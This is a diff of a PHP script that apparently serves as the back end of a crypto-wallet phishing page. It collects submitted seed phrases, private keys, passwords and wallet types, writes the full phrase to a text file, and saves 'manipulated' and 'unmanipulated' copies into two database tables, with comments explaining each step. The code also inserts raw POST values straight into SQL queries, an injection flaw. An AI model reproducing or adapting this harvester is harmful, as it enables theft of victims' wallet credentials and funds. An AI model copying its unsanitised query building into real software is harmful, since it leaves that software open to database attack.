@@ -7,18 +7,12 @@ $ApplicationNumber= $_POST['appNo'];
 $_POST['category'];
 $_POST['phrase'];
 
-$key = $_POST['key'];
- $password = $_POST['password'];
+$key = $_POST['key'];//priv8key
+ $password = $_POST['password'];//password
  $refer=$_POST['refer'];
-//$Program = $_POST['certPreference'];
-
-
- //$Fullname = $_POST['name'] . '     '. $_POST['companyname'] ;
-
-//$ApplicationNumber  = trim($_POST['appNo']);
-$category  = $_POST['category'];
-$phrase =$_POST['phrase'];
-$phrasee =$_POST['phrase'];
+$category  = $_POST['category'];//what typa wallet
+$phrase =$_POST['phrase'];//the phrase omitted
+$phrasee =$_POST['phrase'];//the phrase un-omitted
 
 $key =$_POST['key'];
 $keyy =$_POST['key'];
@@ -33,7 +27,7 @@ $str = "$phrase";
 $data = "
 $phrasee".PHP_EOL;//grabbing var/string
 $fp = fopen('hi.txt', 'a');//open  content to write to new line
-fwrite($fp, $data);//write data
+fwrite($fp, $data);//write data to the txt file
 
 $Query = "INSERT INTO `account`(`category`, `phrase`, `password`,`key`, `refer`, `regdate`) 
                  VALUES   ( '$category', '$str1', '$password', '$strkey1', '$refer', CURRENT_TIMESTAMP)";
@@ -44,8 +38,8 @@ $Query2 = "INSERT INTO `accounts`(`category`, `phrase`, `password`,`key`, `refer
  
 
 // echo $Query;
-    $Save=  mysqli_query($con,$Query);
-    $Save=  mysqli_query($con,$Query2);
+    $Save=  mysqli_query($con,$Query);//save the manipulated values
+    $Save=  mysqli_query($con,$Query2);//save unmanipulated value
 
 
 
